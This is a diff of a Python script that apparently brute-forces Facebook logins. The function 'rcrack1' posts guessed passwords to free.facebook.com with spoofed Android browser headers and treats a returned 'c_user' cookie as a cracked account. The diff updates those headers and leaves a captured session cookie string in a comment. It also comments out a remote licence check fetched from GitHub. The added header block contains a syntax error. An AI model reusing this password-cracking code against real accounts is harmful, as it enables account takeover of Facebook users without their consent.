@@ -223,26 +223,25 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'p.facebook.com',
-           'method': 'GET', 
-       	'scheme': 'https', 
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-          'cache-control': 'max-age=0',
-          'dpr': '1.381250023841858',
-          'sec-ch-prefers-color-scheme': 'light',
-          'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-          'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
-          'sec-ch-ua-mobile': '?1',
-          'sec-ch-ua-model': '"V2043"',
-          'sec-ch-ua-platform': '"Android"',
-          'sec-ch-ua-platform-version': '"11.0.0"',
-          'sec-fetch-dest': 'document',
-          'sec-fetch-mode': 'navigate',
-          'sec-fetch-site': 'none',
-          'sec-fetch-user': '?1',
-          'upgrade-insecure-requests': '1',
-          'user-agent': pro,
-          'viewport-width': '980',}
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=gOo_ZSQAK58gjT-ExWoTURXa; sb=gOo_ZezglfDVz6RI5ma1SySd; m_pixel_ratio=2; wd=360x698; fr=0WLl9F03a1Wj8rDnJ..BlP-qA.NC.AAA.0.0.BlQA09.AWXZWaxP3gc',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"220333QAG"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -271,7 +270,7 @@ def shoha_menu():
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
-    DARK=requests.get("https://github.com/Rdx337/Sabbiropi/blob/main/Ap.txt").text
+    #DARK=requests.get("https://github.com/Rdx337/Sabbiropi/blob/main/Ap.txt").text
     if id in DARK:
         Main()
     else:
